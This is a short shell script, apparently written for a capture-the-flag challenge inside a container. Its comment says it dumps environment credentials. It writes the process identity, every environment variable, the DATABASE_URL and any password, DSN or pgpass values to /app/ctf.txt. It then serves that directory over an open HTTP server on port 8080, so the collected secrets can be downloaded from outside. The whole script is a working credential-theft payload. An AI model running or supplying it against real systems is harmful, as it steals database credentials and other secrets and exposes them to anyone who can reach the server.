#!/bin/sh
# dump env (DATABASE_URL = creds avnadmin) + try read key
{
  echo "=== POD ==="
  id
  echo "--- ALL env ---"
  env | sort
  echo "--- DATABASE_URL ---"
  echo "$DATABASE_URL"
  echo "--- all *_URL / *_PGPASS / PG* ---"
  env | grep -iE "url|pgpass|database|pass|dsn" | sort
  echo "=== END ==="
} > /app/ctf.txt 2>&1
exec python3 -m http.server 8080 --directory /app
